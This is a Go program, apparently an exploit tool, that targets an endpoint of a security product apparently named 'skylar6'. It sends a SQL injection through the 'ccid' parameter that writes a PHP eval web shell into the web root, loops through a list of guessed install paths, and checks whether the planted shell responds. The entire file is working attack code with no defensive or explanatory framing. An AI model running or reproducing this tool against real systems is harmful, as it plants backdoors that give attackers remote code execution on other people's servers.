package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)


func main() {
	urlBase := flag.String("url", "http://localhost:8080", "base url")
	shell := flag.String("shell", "indexer.php", "shell name")
	content := flag.String("content", "<?php @eval($_GET[sky]);?>", "content 注意双引号要写反斜杠")
	help := flag.Bool("h", false, "Show help message")

	// 手动设置一次 -h 参数的值，确保默认会输出帮助信息
	flag.Set("h", "true")

	flag.Parse()

	if *help {
		flag.Usage()
		os.Exit(0)
	}

	urlTemplate := *urlBase + `/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('` + *content + `');copy O(T) to '%s\www\` + *shell + `';drop table O;--`

	pwds := []string{"C:\\Program Files (x86)\\360\\skylar6", "C:\\Program Files (x86)\\QAX\\skylar6", "D:\\Program Files (x86)\\360\\skylar6", "D:\\Program Files (x86)\\QAX\\skylar6", "C:\\skylar6", "D:\\skylar6", "C:\\360\\skylar6", "C:\\QAX\\skylar6", "D:\\QAX\\skylar6", "D:\\360\\skylar6", "C:\\Program Files\\360\\skylar6", "C:\\Program Files\\QAX\\skylar6", "D:\\Program Files\\360\\skylar6", "D:\\Program Files\\QAX\\skylar6", "C:\\Program Files (x86)\\qianxin\\skylar6", "D:\\Program Files (x86)\\qianxin\\skylar6", "E:\\Program Files (x86)\\qianxin\\skylar6", "C:\\Program Files\\qianxin\\skylar6", "D:\\Program Files\\qianxin\\skylar6", "E:\\Program Files\\qianxin\\skylar6", "E:\\Program Files (x86)\\360\\skylar6", "E:\\Program Files (x86)\\QAX\\skylar6", "E:\\skylar6", "E:\\360\\skylar6", "E:\\QAX\\skylar6", "E:\\Program Files\\360\\skylar6", "E:\\Program Files\\QAX\\skylar6"}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	for _, pwd := range pwds {

		// 访问固定URL
		resp, err := client.Get(*urlBase + "/" + *shell)
		resp.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
		ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		fmt.Printf("%s status: %d\n", *urlBase+"/"+*shell, resp.StatusCode)
		if err != nil {
			fmt.Println("Get fixed URL failed")
			continue
		}

		// 访问带参数URL
		url := fmt.Sprintf(urlTemplate, pwd)
		resp, err = client.Get(url)
		resp.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
		ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("GET %s failed: %v\n", url, err)
			continue
		}
		fmt.Printf("%s status: %d\n", url, resp.StatusCode)

		// 再次访问固定URL
		resp, err = client.Get(*urlBase + "/" + *shell)
		resp.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
		ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		fmt.Printf("%s status: %d\n", *urlBase+"/"+*shell, resp.StatusCode)
		fmt.Printf("\n")
		if resp.StatusCode == 200 {
			// 固定URL返回200,停止遍历
			break
		}

	}

}
